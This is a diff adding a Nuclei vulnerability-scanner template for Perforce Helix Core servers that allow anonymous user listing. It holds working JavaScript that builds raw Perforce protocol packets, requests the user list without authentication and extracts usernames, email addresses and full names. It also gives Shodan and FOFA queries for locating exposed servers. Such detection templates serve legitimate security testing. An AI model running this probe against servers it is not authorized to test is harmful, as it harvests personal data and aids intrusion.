@@ -1,0 +1,234 @@
+id: perforce-user-enumeration
+
+info:
+  name: Perforce Server - User Enumeration
+  author: Morgan Robertson
+  severity: medium
+  description: |
+    Detected Perforce server allowed anonymous user listing due to run.users.authorize being set to 0 (the default). The server returned a full list of users including usernames, email addresses, and full names without authentication. Both ASCII and Unicode server modes were affected. SSL-enforcing servers are not affected.
+  reference:
+    - https://morganrobertson.net/p4wned/
+    - https://www.keysight.com/blogs/en/tech/nwvs/2022/06/08/a-sneak-peek-into-the-protocol-behind-perforce
+    - https://help.perforce.com/helix-core/release-notes/current/relnotes.txt
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N
+    cvss-score: 5.3
+    cwe-id: CWE-200
+    cpe: cpe:2.3:a:perforce:helix_core:*:*:*:*:*:*:*:*
+  metadata:
+    verified: true
+    max-request: 3
+    vendor: perforce
+    product: helix_core
+    shodan-query: port:1666 "P4D"
+    fofa-query: port="1666" && protocol="unknown"
+  tags: perforce,helixcore,scm,unauth,user-listing,enum
+
+flow: tcp(1) && javascript(1)
+
+tcp:
+  - host:
+      - "{{Host}}:1666"
+    inputs:
+      - type: hex
+        data: "efef000000636d7066696c65000000000000616c7453796e63000000000000636c69656e7400020000003937006170690005000000393939393900656e61626c6553747265616d73000000000000656e61626c654772617068000000000000657870616e64416e646d6170730000000000006368756e6b696e67000000000000686f737400090000006c6f63616c686f737400706f727400120000003139322e3136382e302e3130313a3136363600736e646275660007000000313936393931390072637662756600050000003938333034006175746f54756e650001000000310066756e63000800000070726f746f636f6c00eded00000076657273696f6e001c000000323032342e322f4c494e555832365838365f36342f32363937383232006175746f4c6f67696e00000000000070726f670002000000703400636c69656e7400090000006c6f63616c686f73740063776400040000002f746d7000686f737400090000006c6f63616c686f7374006f730004000000554e4958006c6f63616c65000100000043007573657200040000007573657200756e69636f6465000000000000636861727365740001000000310075746638626f6d00010000003100636c69656e74436173650001000000300066756e630009000000757365722d696e666f00"
+    read-size: 4096
+    matchers:
+      - type: word
+        part: data
+        encoding: hex
+        words:
+          - "xfiles"
+          - "server"
+        condition: and
+        internal: true
+
+javascript:
+  - code: |
+      var net = require("nuclei/net");
+
+      function strToHex(str) {
+          var hex = "";
+          for (var i = 0; i < str.length; i++) {
+              var h = str.charCodeAt(i).toString(16);
+              if (h.length < 2) h = "0" + h;
+              hex += h;
+          }
+          return hex;
+      }
+
+      function numToHexLE(num) {
+          var b1 = (num & 0xFF), b2 = ((num >> 8) & 0xFF), b3 = ((num >> 16) & 0xFF), b4 = ((num >> 24) & 0xFF);
+          return [b1, b2, b3, b4].map(function(s){
+             var x = s.toString(16);
+             return (x.length<2 ? "0"+x : x);
+          }).join("");
+      }
+
+      function packParamHex(name, value) {
+          return strToHex(name) + "00" + numToHexLE(value.length) + strToHex(value) + "00";
+      }
+
+      function buildPacketHex(params) {
+          var payloadHex = "";
+          for (var i = 0; i < params.length; i++) {
+              payloadHex += packParamHex(params[i][0], params[i][1]);
+          }
+          var totalLen = payloadHex.length / 2;
+          var lenLow = totalLen & 0xFF;
+          var lenHigh = (totalLen >> 8) & 0xFF;
+          var xor = lenLow ^ lenHigh;
+          var headerHex = [xor, lenLow, lenHigh, 0, 0].map(function(s){
+             var x = s.toString(16);
+             return (x.length<2 ? "0"+x : x);
+          }).join("");
+          return headerHex + payloadHex;
+      }
+
+      function parsePerforceResponse(dataStr) {
+          var offset = 0;
+          var results = [];
+          while (offset < dataStr.length) {
+              if (offset + 5 > dataStr.length) break;
+              var lenLow = dataStr.charCodeAt(offset + 1);
+              var lenHigh = dataStr.charCodeAt(offset + 2);
+              var bodyLen = lenLow | (lenHigh << 8);
+              var totalPacketSize = 5 + bodyLen;
+              if (offset + totalPacketSize > dataStr.length) break;
+
+              var body = dataStr.substring(offset + 5, offset + totalPacketSize);
+              var packetObj = {};
+              var bodyOffset = 0;
+
+              while (bodyOffset < body.length) {
+                  var nameEnd = body.indexOf('\u0000', bodyOffset);
+                  if (nameEnd === -1) break;
+                  var key = body.substring(bodyOffset, nameEnd);
+                  bodyOffset = nameEnd + 1;
+
+                  if (bodyOffset + 4 > body.length) break;
+                  var v0 = body.charCodeAt(bodyOffset);
+                  var v1 = body.charCodeAt(bodyOffset+1);
+                  var v2 = body.charCodeAt(bodyOffset+2);
+                  var v3 = body.charCodeAt(bodyOffset+3);
+                  var valLen = (v0 | (v1 << 8) | (v2 << 16) | (v3 << 24)) >>> 0;
+                  bodyOffset += 4;
+
+                  if (bodyOffset + valLen > body.length) break;
+                  var value = body.substring(bodyOffset, bodyOffset + valLen);
+                  packetObj[key] = value;
+                  bodyOffset += valLen + 1;
+              }
+              results.push(packetObj);
+              offset += totalPacketSize;
+          }
+          return results;
+      }
+
+      function enumUsers(host, port, useUnicode) {
+          var address = host + ":" + port;
+
+          var p1 = [
+              ["cmpfile", ""], ["altSync", ""], ["client", "76"], ["api", "99999"],
+              ["enableStreams", ""], ["enableGraph", ""], ["expandAndmaps", ""], ["chunking", ""],
+              ["host", "localhost"], ["port", address], ["sndbuf", "1969919"], ["rcvbuf", "98304"],
+              ["autoTune", "1"], ["func", "protocol"]
+          ];
+
+          var p2 = [
+              ["version", "2024.2/LINUX26X86_64/2697822"], ["autoLogin", ""], ["prog", "p4"],
+              ["client", "localhost"], ["cwd", "/tmp"], ["host", "localhost"],
+              ["os", "UNIX"], ["locale", "C"], ["user", "temp"]
+          ];
+
+          if (useUnicode) {
+              p2.push(["unicode", ""]);
+          }
+
+          p2.push(["charset", "1"]);
+          p2.push(["utf8bom", "1"]);
+          p2.push(["clientCase", "0"]);
+          p2.push(["func", "user-users"]);
+
+          var p3 = [ ["func", "release"] ];
+
+          var payloadHex = buildPacketHex(p1) + buildPacketHex(p2);
+          var releaseHex = buildPacketHex(p3);
+          var rawBuffer = "";
+
+          try {
+              var conn = net.Open("tcp", address);
+              conn.SendHex(payloadHex);
+              conn.SetTimeout(3);
+
+              for(var loop=0; loop<10; loop++) {
+                  try {
+                      var bytes = conn.Recv(4096);
+                      if (bytes && bytes.length > 0) {
+                          for(var i=0; i < bytes.length; i++) {
+                               rawBuffer += String.fromCharCode(bytes[i]);
+                          }
+                          if (rawBuffer.indexOf('func\u0000\u0007\u0000\u0000\u0000release\u0000') !== -1) {
+                              break;
+                          }
+                      } else {
+                          break;
+                      }
+                  } catch(e) { break; }
+              }
+              try { conn.SendHex(releaseHex); } catch(e) {}
+              conn.Close();
+          } catch(e) { return []; }
+
+          var packets = parsePerforceResponse(rawBuffer);
+          var extractedUsers = [];
+
+          for(var i=0; i < packets.length; i++) {
+              var pkt = packets[i];
+              if (pkt['user'] && pkt['email'] && pkt['func'] === 'client-Message') {
+                  extractedUsers.push({
+                      "user": pkt['user'],
+                      "email": pkt['email'],
+                      "fullName": pkt['fullName'],
+                      "accessDate": pkt['accessDate']
+                  });
+              }
+          }
+          return extractedUsers;
+      }
+
+      var users = enumUsers(Host, Port, false);
+
+      if (users.length === 0) {
+          users = enumUsers(Host, Port, true);
+      }
+
+      JSON.stringify(users);
+
+    args:
+      Host: "{{Host}}"
+      Port: "1666"
+
+    matchers:
+      - type: word
+        words:
+          - '"user":'
+          - '"email":'
+        condition: and
+
+    extractors:
+      - type: json
+        name: users
+        json:
+          - '.[].user'
+
+      - type: json
+        name: emails
+        json:
+          - '.[].email'
+
+      - type: json
+        name: full_names
+        json:
+          - '.[].fullName'
+# digest: 4a0a0047304502203d06c4f4a1645558779e9fa03d978b1999667f9c6e01a2b3c064a4f07989f2d6022100c0cc2e9d8961bf39db2ccadcf4356c77474fd433f7d8aeda6bc4d9f20cea94cb:922c64590222798bb761d5b6d8e72950
